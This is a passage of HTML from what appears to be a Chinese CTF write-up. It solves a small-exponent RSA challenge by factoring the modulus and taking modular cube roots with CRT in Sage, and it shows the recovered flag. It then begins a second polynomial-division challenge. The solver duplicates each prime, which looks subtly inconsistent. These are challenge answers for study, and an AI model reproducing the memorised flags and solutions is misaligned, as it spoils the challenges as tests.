class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="comment"># from secret import falg</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">pad = lambda s:s + bytes([(len(s)-1)%16+1]*((len(s)-1)%16+1))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">n = getPrime(128)**2 * getPrime(128)**2 * getPrime(128)**2 * getPrime(128)**2</span></span><br><span class="line"><span class="string">e = 3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag = pad(flag)</span></span><br><span class="line"><span class="string">print(flag)</span></span><br><span class="line"><span class="string">assert(len(flag) &gt;= 48)</span></span><br><span class="line"><span class="string">m = int.from_bytes(flag,&#x27;big&#x27;)</span></span><br><span class="line"><span class="string">c = pow(m,e,n)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(f&#x27;n = &#123;n&#125;&#x27;)</span></span><br><span class="line"><span class="string">print(f&#x27;e = &#123;e&#125;&#x27;)</span></span><br><span class="line"><span class="string">print(f&#x27;c = &#123;c&#125;&#x27;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">8250871280281573979365095715711359115372504458973444367083195431861307534563246537364248104106494598081988216584432003199198805753721448450911308558041115465900179230798939615583517756265557814710419157462721793864532239042758808298575522666358352726060578194045804198551989679722201244547561044646931280001</span></span><br><span class="line">p1 = <span class="number">260594583349478633632570848336184053653</span></span><br><span class="line">p2 = <span class="number">223213222467584072959434495118689164399</span></span><br><span class="line">p3 = <span class="number">218566259296037866647273372633238739089</span></span><br><span class="line">p4 = <span class="number">225933944608558304529179430753170813347</span></span><br><span class="line">phi = (p1**<span class="number">2</span> - p1)*(p2**<span class="number">2</span> - p2)*(p3**<span class="number">2</span> - p3)*(p4**<span class="number">2</span> - p4)</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">945272793717722090962030960824180726576357481511799904903841312265308706852971155205003971821843069272938250385935597609059700446530436381124650731751982419593070224310399320617914955227288662661442416421725698368791013785074809691867988444306279231013360024747585261790352627234450209996422862329513284149</span></span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="built_in">print</span>(phi)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>yafu跑出各因子</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220731212059170.png" alt="yafu、"></p><p>再有限域开三次方，即解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#脚本2</span></span><br><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">n = <span class="number">8250871280281573979365095715711359115372504458973444367083195431861307534563246537364248104106494598081988216584432003199198805753721448450911308558041115465900179230798939615583517756265557814710419157462721793864532239042758808298575522666358352726060578194045804198551989679722201244547561044646931280001</span></span><br><span class="line">p1 = <span class="number">260594583349478633632570848336184053653</span></span><br><span class="line">p2 = <span class="number">260594583349478633632570848336184053653</span></span><br><span class="line">p3 = <span class="number">223213222467584072959434495118689164399</span></span><br><span class="line">p4 = <span class="number">223213222467584072959434495118689164399</span></span><br><span class="line">p5 = <span class="number">218566259296037866647273372633238739089</span></span><br><span class="line">p6 = <span class="number">218566259296037866647273372633238739089</span></span><br><span class="line">p7 = <span class="number">225933944608558304529179430753170813347</span></span><br><span class="line">p8 = <span class="number">225933944608558304529179430753170813347</span></span><br><span class="line"></span><br><span class="line">phi = (p1**<span class="number">2</span> - p1)*(p2**<span class="number">2</span> - p2)*(p3**<span class="number">2</span> - p3)*(p4**<span class="number">2</span> - p4)</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">945272793717722090962030960824180726576357481511799904903841312265308706852971155205003971821843069272938250385935597609059700446530436381124650731751982419593070224310399320617914955227288662661442416421725698368791013785074809691867988444306279231013360024747585261790352627234450209996422862329513284149</span></span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(p1),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">A=a^e-c</span><br><span class="line">mas=A.monic().roots()</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(p2),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">B=a^e-c</span><br><span class="line">mbs=B.monic().roots()</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(p3),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">C=a^e-c</span><br><span class="line">mcs=C.monic().roots()</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(p4),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">D=a^e-c</span><br><span class="line">mds=D.monic().roots()</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(p5),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">E=a^e-c</span><br><span class="line">mes=E.monic().roots()</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(p6),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">F=a^e-c</span><br><span class="line">mfs=F.monic().roots()</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(p7),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">G=a^e-c</span><br><span class="line">mgs=G.monic().roots()</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(p8),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">H=a^e-c</span><br><span class="line">mhs=H.monic().roots()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> maa <span class="keyword">in</span> mas:</span><br><span class="line">    tmp1=maa[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> mbb <span class="keyword">in</span> mbs:</span><br><span class="line">        tmp2=mbb[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> mcc <span class="keyword">in</span> mcs:</span><br><span class="line">            tmp3=mcc[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">for</span> mdd <span class="keyword">in</span> mds:</span><br><span class="line">                tmp4=mdd[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">for</span> mee <span class="keyword">in</span> mes:</span><br><span class="line">                    tmp5=mee[<span class="number">0</span>]</span><br><span class="line">                    <span class="keyword">for</span> mff <span class="keyword">in</span> mfs:</span><br><span class="line">                        tmp6=mff[<span class="number">0</span>]</span><br><span class="line">                        <span class="keyword">for</span> mgg <span class="keyword">in</span> mgs:</span><br><span class="line">                            tmp7=mgg[<span class="number">0</span>]</span><br><span class="line">                            <span class="keyword">for</span> mhh <span class="keyword">in</span> mhs:</span><br><span class="line">                                tmp8=mhh[<span class="number">0</span>]</span><br><span class="line">                                <span class="keyword">try</span>:</span><br><span class="line">                                    solution = CRT_list([<span class="built_in">int</span>(tmp1), <span class="built_in">int</span>(tmp2), <span class="built_in">int</span>(tmp3), <span class="built_in">int</span>(tmp4), <span class="built_in">int</span>(tmp5), <span class="built_in">int</span>(tmp6), <span class="built_in">int</span>(tmp7), <span class="built_in">int</span>(tmp8)], [p1,p2,p3,p4,p5,p6,p7,p8])</span><br><span class="line">                                    flag = <span class="built_in">str</span>(libnum.n2s(<span class="built_in">int</span>(solution)))</span><br><span class="line">                                    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">                                        <span class="built_in">print</span>(flag)</span><br><span class="line">                                    <span class="keyword">if</span> <span class="string">&#x27;ctf&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">                                        <span class="built_in">print</span>(flag)</span><br><span class="line">                                <span class="keyword">except</span>:</span><br><span class="line">                                    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># flag&#123;Fear_can_hold_you_prisoner_Hope_can_set_you_free&#125;\x06\x06\x06\x06\x06\x06&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>flag{Fear_can_hold_you_prisoner_Hope_can_set_you_free}</p></blockquote><h2 id="polydiv"><a href="#polydiv" class="headerlink" title="polydiv"></a>polydiv</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><ul><li><p>poly2.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Polynomial2</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    模二多项式环，定义方式有三种</span></span><br><span class="line"><span class="string">    一是从高到低给出每一项的系数</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; Polynomial2([1,1,0,1])</span></span><br><span class="line"><span class="string">        x^3 + x^2 + 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    二是写成01字符串形式</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; Polynomial2(&#x27;1101&#x27;)</span></span><br><span class="line"><span class="string">        x^3 + x^2 + 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    三是直接给出系数为1的项的阶</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; Poly([3,1,4])</span></span><br><span class="line"><span class="string">        x^4 + x^3 + x</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; Poly([]) # 加法元</span></span><br><span class="line"><span class="string">        0</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; Poly(0) # 乘法元</span></span><br><span class="line"><span class="string">        1</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; Poly(1,2) * Poly(2,3)</span></span><br><span class="line"><span class="string">        x^5 + x^3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,ll</span>):</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(ll) ==  <span class="built_in">str</span>:</span><br><span class="line">            ll = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,ll))</span><br><span class="line"></span><br><span class="line">        self.param = ll[::-<span class="number">1</span>]</span><br><span class="line">        self.ones = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(self.param)) <span class="keyword">if</span> self.param[i] == <span class="number">1</span>] <span class="comment"># 系数为1的项的阶数列表</span></span><br><span class="line">        self.Latex = self.latex()</span><br><span class="line">        self.b = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> ll]) <span class="comment"># 01串形式打印系数</span></span><br><span class="line">        </span><br><span class="line">        self.order = <span class="number">0</span> <span class="comment"># 最高阶</span></span><br><span class="line">        <span class="keyword">try</span>:self.order = <span class="built_in">max</span>(self.ones)</span><br><span class="line">        <span class="keyword">except</span>:<span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">format</span>(<span class="params">self,reverse = <span class="literal">True</span></span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            格式化打印字符串</span></span><br><span class="line"><span class="string">            默认高位在左</span></span><br><span class="line"><span class="string">            reverse = False时，低位在左</span></span><br><span class="line"><span class="string">            但是注意定义多项式时只能高位在右</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        r = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.ones) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> reverse:</span><br><span class="line">            <span class="keyword">return</span> ((<span class="string">&#x27; + &#x27;</span>.join(<span class="string">f&#x27;x^<span class="subst">&#123;i&#125;</span>&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> self.ones[::-<span class="number">1</span>])+<span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27;x^0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>).replace(<span class="string">&#x27;x^1 &#x27;</span>,<span class="string">&#x27;x &#x27;</span>)).strip()</span><br><span class="line">        <span class="keyword">return</span> ((<span class="string">&#x27; + &#x27;</span>.join(<span class="string">f&#x27;x^<span class="subst">&#123;i&#125;</span>&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> self.ones)+<span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27;x^0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>).replace(<span class="string">&#x27;x^1 &#x27;</span>,<span class="string">&#x27;x &#x27;</span>)).strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span>(<span class="params">self,x</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            懒得写了，用不到</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;call(<span class="subst">&#123;x&#125;</span>)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__add__</span>(<span class="params">self,other</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            多项式加法</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        a,b = self.param[::-<span class="number">1</span>],other.param[::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a) &lt; <span class="built_in">len</span>(b):a,b = b,a</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">            <span class="keyword">try</span>:a[-<span class="number">1</span>-i] = (b[-<span class="number">1</span>-i] + a[-<span class="number">1</span>-i]) % <span class="number">2</span></span><br><span class="line">            <span class="keyword">except</span>:<span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> Polynomial2(a)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__mul__</span>(<span class="params">self,other</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            多项式乘法</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        a,b = self.param[::-<span class="number">1</span>],other.param[::-<span class="number">1</span>]</span><br><span class="line">        r = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a) + <span class="built_in">len</span>(b) - <span class="number">1</span>)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">            <span class="keyword">if</span> b[-i-<span class="number">1</span>] == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> i != <span class="number">0</span>:sa = a+[<span class="number">0</span>]*i</span><br><span class="line">                <span class="keyword">else</span>:sa = a</span><br><span class="line">                sa = [<span class="number">0</span>] * (<span class="built_in">len</span>(r)-<span class="built_in">len</span>(sa)) + sa</span><br><span class="line">                <span class="comment">#r += np.array(sa)</span></span><br><span class="line">                <span class="comment">#r %= 2</span></span><br><span class="line">                r = [(r[t] + sa[t])%<span class="number">2</span> <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(r))]</span><br><span class="line">        <span class="keyword">return</span> Polynomial2(r)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__sub__</span>(<span class="params">self,oo</span>):</span></span><br><span class="line">        <span class="comment"># 模二多项式环，加减相同</span></span><br><span class="line">        <span class="keyword">return</span> self + oo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.<span class="built_in">format</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.<span class="built_in">format</span>()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__pow__</span>(<span class="params">self,a</span>):</span></span><br><span class="line">        <span class="comment"># 没有大数阶乘的需求，就没写快速幂</span></span><br><span class="line">        t = Polynomial2([<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(a):</span><br><span class="line">            t *= self</span><br><span class="line">        <span class="keyword">return</span> t</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">latex</span>(<span class="params">self,reverse=<span class="literal">True</span></span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            Latex格式打印...其实就是给两位及以上的数字加个括号&#123;&#125;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">latex_pow</span>(<span class="params">x</span>):</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(x)) &lt;= <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">str</span>(x)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#123;&#x27;</span>+<span class="built_in">str</span>(x)+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">        </span><br><span class="line">        r = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.ones) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> reverse:</span><br><span class="line">            <span class="keyword">return</span> (<span class="string">&#x27; + &#x27;</span>.join(<span class="string">f&#x27;x^<span class="subst">&#123;latex_pow(i)&#125;</span>&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> self.ones[::-<span class="number">1</span>])+<span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27;x^0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>).replace(<span class="string">&#x27; x^1 &#x27;</span>,<span class="string">&#x27; x &#x27;</span>).strip()</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&#x27; + &#x27;</span>.join(<span class="string">f&#x27;x^<span class="subst">&#123;latex_pow(i)&#125;</span>&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> self.ones)+<span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27;x^0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>).replace(<span class="string">&#x27; x^1 &#x27;</span>,<span class="string">&#x27; x &#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span>(<span class="params">self,other</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.ones == other.ones</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__lt__</span>(<span class="params">self,other</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(self.ones) &lt; <span class="built_in">max</span>(other.ones)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__le__</span>(<span class="params">self,other</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(self.ones) &lt;= <span class="built_in">max</span>(other.ones)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Poly</span>(<span class="params">*args</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        另一种定义方式</span></span><br><span class="line"><span class="string">        Poly([3,1,4]) 或 Poly(3,1,4)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(args) == <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">type</span>(args[<span class="number">0</span>]) <span class="keyword">in</span> [<span class="built_in">list</span>,<span class="built_in">tuple</span>]:</span><br><span class="line">        args = args[<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(args) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> Polynomial2(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    ll = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">max</span>(args)+<span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> args:</span><br><span class="line">        ll[i] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> Polynomial2(ll[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">PP = Polynomial2</span><br><span class="line">P = Poly</span><br><span class="line"><span class="comment"># 简化名称,按长度区分 P 和 PP</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = Polynomial2(<span class="string">&#x27;10011&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line">    p3 = Polynomial2(<span class="string">&#x27;11111&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(p3)</span><br><span class="line">    Q = p*p3</span><br><span class="line">    <span class="built_in">print</span>(Q)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>task.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> os, sys, signal</span><br><span class="line"><span 